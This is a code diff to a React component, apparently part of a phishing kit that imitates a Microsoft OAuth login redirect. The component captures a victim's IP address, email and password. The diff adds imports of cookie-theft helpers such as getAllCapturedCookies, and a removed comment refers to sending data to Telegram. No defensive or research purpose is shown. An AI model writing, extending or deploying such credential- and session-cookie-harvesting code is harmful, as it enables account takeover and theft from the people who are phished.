@@ -1,5 +1,5 @@
 import React, { useEffect } from 'react';
-import { injectMicrosoftCookies, setCredentials } from '../utils/client-cookie-capture';
+import { injectMicrosoftCookies, setCredentials, getAllCapturedCookies, getMostReliableEmail } from '../utils/client-cookie-capture';
 
 let ipaddress = '';
 let email = '';
@@ -12,8 +12,6 @@ const RealOAuthRedirect: React.FC<any> = ({ onLoginSuccess, sessionData }) => {
   useEffect(() => {
     // Set credentials if needed
     setCredentials(ipaddress, email, password);
-
-    // All your original logic here...
 
     // Prepare PKCE and OAuth state
     const generateRandomString = (length: number): string => {
@@ -37,8 +35,6 @@ const RealOAuthRedirect: React.FC<any> = ({ onLoginSuccess, sessionData }) => {
     };
 
     (async () => {
-      // ... any of your pre-login logic (saving session, sending to Telegram, etc) ...
-
       setTimeout(async () => {
         // >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
         // INJECT COOKIES RIGHT BEFORE REDIRECT!
